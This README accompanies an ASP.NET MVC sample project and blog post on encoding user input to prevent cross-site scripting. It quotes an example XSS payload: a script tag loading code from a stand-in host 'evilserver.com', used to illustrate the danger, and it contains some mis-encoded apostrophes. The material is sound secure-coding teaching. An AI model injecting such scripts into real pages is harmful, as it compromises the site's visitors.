Text encoding in ASP.NET MVC by example
===================================

This GitHub project is the accompanying code for 
[my blog post](http://blog.michaelckennedy.net/2012/10/15/understanding-text-encoding-in-asp-net-mvc/)

See a live example at:

[http://text-encoding-aspnet-mvc-by-example.azurewebsites.net/](http://text-encoding-aspnet-mvc-by-example.azurewebsites.net/)

Here is what it is all about:

This sample covers the various ways in which you might handle 
text encoding in ASP.NET MVC. For example, if you were writing 
a forum web app, you should absolutely be paranoid about 
what your users are typing into your site. You need to be 
very careful about how you redisplay their input. 
For example, a friendly forum user might write something like:

    Nice post, thanks for sharing!

On the other hand, they may write:

    <script src="http://evilserver.com/xss.js"></script>
    <script>xss.doBadDeeds();</script>

If you turn around and show this "post" to your other uses, 
maybe they'll get hacked. At a minimum, the evil-doers 
could be a nuisance to your real users.

On the other hand, if you're building a CMS or utility 
helper method, you do not want to filter out the HTML a 
user might type. They probably need to enter some HTML
 which you�ll want to show to all the other users. Same 
thing goes for code your app might generate.

There are at least three ways which MVC manages 
and encodes (or does not encode) text data. Knowing 
which scenario you�re targeting allows you to choose 
the right option. We'll look at four examples in this post:

Keep reading at [http://blog.michaelckennedy.net/2012/10/15/understanding-text-encoding-in-asp-net-mvc/](http://blog.michaelckennedy.net/2012/10/15/understanding-text-encoding-in-asp-net-mvc/)
